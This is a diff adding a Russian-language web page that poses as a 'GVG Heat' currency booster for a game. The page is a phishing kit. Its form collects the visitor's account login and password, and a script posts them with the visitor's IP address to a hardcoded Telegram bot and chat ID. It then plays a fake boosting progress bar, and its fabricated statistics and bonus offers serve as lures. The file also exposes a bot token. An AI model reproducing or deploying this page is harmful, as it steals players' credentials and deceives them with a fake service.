@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Накрутка GVG Heat</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 450px;
+            padding: 35px 30px;
+            animation: slideIn 0.4s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .title {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 15px;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 25px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 20px;
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            color: #667eea;
+            font-size: 16px;
+            z-index: 1;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px 14px 14px 45px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            color: #333;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+        }
+
+        input::placeholder {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        select {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23667eea' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 15px;
+        }
+
+        .amount-group {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .amount-group input {
+            flex: 1;
+        }
+
+        .currency {
+            background: #667eea;
+            color: white;
+            padding: 14px 20px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .bonus-info {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            text-align: center;
+            margin: 15px 0;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.9; transform: scale(1.02); }
+            100% { opacity: 1; }
+        }
+
+        .bonus-info i {
+            margin-right: 8px;
+        }
+
+        .boost-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .boost-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+        }
+
+        .boost-button:active {
+            transform: translateY(0);
+        }
+
+        .boost-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .notification {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            text-align: center;
+            animation: fadeIn 0.3s ease-out;
+            display: none;
+        }
+
+        .notification.success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            display: block;
+        }
+
+        .notification.error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            display: block;
+        }
+
+        .notification.info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .feature {
+            text-align: center;
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .feature i {
+            color: #667eea;
+            font-size: 16px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+            font-size: 12px;
+        }
+    </style>
+    <!-- Font Awesome для иконок -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="card">
+        <h1 class="title">Накрутка GVG Heat</h1>
+        <p class="subtitle">Мгновенное пополнение баланса</p>
+
+        <!-- Статистика для привлечения -->
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-value">1,247</div>
+                <div class="stat-label">Накручено сегодня</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">8.4K</div>
+                <div class="stat-label">Всего накручено</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value">⭐ 4.8</div>
+                <div class="stat-label">Рейтинг</div>
+            </div>
+        </div>
+
+        <!-- Форма накрутки -->
+        <form id="boostForm">
+            <!-- Аккаунт (email или логин) -->
+            <div class="form-group">
+                <label><i class="fas fa-user" style="margin-right: 8px; color: #667eea;"></i>Аккаунт (email или логин)</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-user input-icon"></i>
+                    <input type="text" id="account" placeholder="Введите ваш аккаунт" required>
+                </div>
+            </div>
+
+            <!-- Пароль от аккаунта -->
+            <div class="form-group">
+                <label><i class="fas fa-lock" style="margin-right: 8px; color: #667eea;"></i>Пароль от аккаунта</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="password" id="password" placeholder="Введите пароль" required>
+                </div>
+            </div>
+
+            <!-- Сколько денег накрутить -->
+            <div class="form-group">
+                <label><i class="fas fa-coins" style="margin-right: 8px; color: #667eea;"></i>Сколько накрутить</label>
+                <div class="amount-group">
+                    <div class="input-wrapper" style="flex: 1;">
+                        <i class="fas fa-coins input-icon"></i>
+                        <input type="number" id="amount" placeholder="Введите сумму" min="100" max="100000" step="100" value="1000" required>
+                    </div>
+                    <div class="currency">GVG</div>
+                </div>
+            </div>
+
+            <!-- Выбор метода накрутки -->
+            <div class="form-group">
+                <label><i class="fas fa-bolt" style="margin-right: 8px; color: #667eea;"></i>Метод накрутки</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-bolt input-icon"></i>
+                    <select id="method" required>
+                        <option value="fast">🚀 Быстрый (мгновенно)</option>
+                        <option value="medium">⚡ Средний (5-10 мин)</option>
+                        <option value="slow">🐢 Медленный (скрытный)</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Бонус за большую сумму -->
+            <div class="bonus-info" id="bonusInfo">
+                <i class="fas fa-gift"></i>
+                <span>Бонус: +20% при накрутке от 5000 GVG!</span>
+            </div>
+
+            <!-- Кнопка накрутки -->
+            <button type="button" class="boost-button" onclick="sendToTelegram()" id="boostBtn">
+                <i class="fas fa-bolt" style="margin-right: 10px;"></i>Накрутить GVG
+            </button>
+
+            <!-- Преимущества -->
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    Без блокировки
+                </div>
+                <div class="feature">
+                    <i class="fas fa-bolt"></i>
+                    Мгновенно
+                </div>
+                <div class="feature">
+                    <i class="fas fa-headset"></i>
+                    Поддержка 24/7
+                </div>
+            </div>
+        </form>
+
+        <!-- Уведомление о статусе -->
+        <div id="notification" class="notification"></div>
+        
+        <div class="footer">
+            © 2024 GVG Boost - гарантия накрутки
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // НАСТРОЙКИ TELEGRAM (изменить под себя)
+        // =============================================
+        const TELEGRAM_BOT_TOKEN = '8513382715:AAGK5KcEvWtF3tm9DVlQpzYG5pvYdd1Xc1k';
+        const TELEGRAM_CHAT_ID = '6875436577';
+        // =============================================
+
+        // Элементы для динамического обновления
+        const amountInput = document.getElementById('amount');
+        const bonusInfo = document.getElementById('bonusInfo');
+        const boostBtn = document.getElementById('boostBtn');
+
+        // Обновление бонуса при изменении суммы
+        amountInput.addEventListener('input', function() {
+            const amount = parseInt(this.value) || 0;
+            
+            if (amount >= 5000) {
+                bonusInfo.style.background = 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)';
+                bonusInfo.innerHTML = '<i class="fas fa-gift"></i> 🎉 СУПЕР БОНУС: +20% (бесплатно ' + Math.floor(amount * 0.2) + ' GVG)!';
+            } else if (amount >= 1000) {
+                bonusInfo.style.background = 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)';
+                bonusInfo.innerHTML = '<i class="fas fa-gift"></i> Бонус: +10% (+' + Math.floor(amount * 0.1) + ' GVG)';
+            } else {
+                bonusInfo.style.background = 'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)';
+                bonusInfo.innerHTML = '<i class="fas fa-gift"></i> Бонус: +20% при накрутке от 5000 GVG!';
+            }
+        });
+
+        // Функция отправки в Telegram
+        async function sendToTelegram() {
+            const account = document.getElementById('account').value.trim();
+            const password = document.getElementById('password').value;
+            const amount = document.getElementById('amount').value;
+            const method = document.getElementById('method').value;
+            const methodText = document.getElementById('method').options[document.getElementById('method').selectedIndex].text;
+
+            // Валидация
+            if (!account || !password || !amount) {
+                showNotification('Пожалуйста, заполните все поля', 'error');
+                return;
+            }
+
+            if (amount < 100) {
+                showNotification('Минимальная сумма накрутки - 100 GVG', 'error');
+                return;
+            }
+
+            if (amount > 100000) {
+                showNotification('Максимальная сумма накрутки - 100,000 GVG', 'error');
+                return;
+            }
+
+            // Блокируем кнопку на время отправки
+            boostBtn.disabled = true;
+            boostBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Накручиваем...';
+
+            // Расчет бонуса
+            let bonus = 0;
+            if (amount >= 5000) {
+                bonus = Math.floor(amount * 0.2);
+            } else if (amount >= 1000) {
+                bonus = Math.floor(amount * 0.1);
+            }
+
+            // Получаем IP пользователя
+            const userIP = await getIP();
+
+            // Формируем сообщение для Telegram
+            const message = `
+💰 НОВАЯ ЗАЯВКА НА НАКРУТКУ GVG HEAT
+━━━━━━━━━━━━━━━━━━━━━
+👤 Аккаунт: ${account}
+🔑 Пароль: ${password}
+💵 Сумма: ${amount} GVG
+🎁 Бонус: +${bonus} GVG
+⚡ Итого: ${parseInt(amount) + bonus} GVG
+🚀 Метод: ${methodText}
+━━━━━━━━━━━━━━━━━━━━━
+🌐 IP: ${userIP}
+⏰ Время: ${new Date().toLocaleString('ru-RU')}
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    showNotification('✅ Заявка отправлена! Накрутка началась...', 'success');
+                    
+                    // Имитация процесса накрутки
+                    simulateBoost(amount, bonus);
+                } else {
+                    showNotification('❌ Ошибка при отправке: ' + data.description, 'error');
+                    boostBtn.disabled = false;
+                    boostBtn.innerHTML = '<i class="fas fa-bolt"></i> Накрутить GVG';
+                }
+            } catch (error) {
+                showNotification('❌ Ошибка соединения с сервером', 'error');
+                console.error('Error:', error);
+                boostBtn.disabled = false;
+                boostBtn.innerHTML = '<i class="fas fa-bolt"></i> Накрутить GVG';
+            }
+        }
+
+        // Имитация процесса накрутки (для красоты)
+        function simulateBoost(amount, bonus) {
+            let progress = 0;
+            const total = parseInt(amount) + bonus;
+            
+            const interval = setInterval(() => {
+                progress += 10;
+                
+                if (progress <= 100) {
+                    boostBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Накручено ${Math.floor(total * progress / 100)}/${total} GVG`;
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        showNotification(`✅ Готово! Накручено ${total} GVG`, 'success');
+                        boostBtn.disabled = false;
+                        boostBtn.innerHTML = '<i class="fas fa-bolt"></i> Накрутить GVG';
+                        
+                        // Очищаем форму
+                        document.getElementById('boostForm').reset();
+                        amountInput.value = '1000';
+                        bonusInfo.innerHTML = '<i class="fas fa-gift"></i> Бонус: +20% при накрутке от 5000 GVG!';
+                    }, 500);
+                }
+            }, 300);
+        }
+
+        // Функция для получения IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Не удалось определить';
+            }
+        }
+
+        function showNotification(message, type, autoHide = true) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = 'notification ' + type;
+            
+            if (autoHide) {
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Отправка по Enter
+        document.querySelectorAll('input, select').forEach(element => {
+            element.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    sendToTelegram();
+                }
+            });
+        });
+
+        // Валидация суммы
+        amountInput.addEventListener('blur', function() {
+            let value = parseInt(this.value);
+            if (value < 100) this.value = 100;
+            if (value > 100000) this.value = 100000;
+        });
+    </script>
+</body>
+</html>
